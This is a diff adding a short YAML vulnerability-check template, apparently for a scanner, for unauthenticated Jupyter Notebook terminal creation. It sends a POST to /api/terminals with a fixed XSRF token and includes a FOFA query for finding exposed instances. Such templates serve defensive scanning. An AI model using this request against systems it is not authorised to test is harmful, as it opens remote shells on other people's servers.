@@ -1,0 +1,25 @@
+id: jupyter-notebook-rce
+
+info: 
+  name: Jupyter Notebook RCE
+  author: xpoc
+  severity: critical
+  verified: true
+  description: |
+    FOFA: app="Jupyter-Notebook"
+  tags: jupyter,rce
+  created: 2023/06/22
+
+rules:
+  r1:
+    request:
+      method: POST
+      path: /api/terminals
+      headers:
+        X-XSRFToken: 2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+        cookie: _xsrf=2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b"name") && 
+      response.body.bcontains(b"last_activity")
+expression: r1()
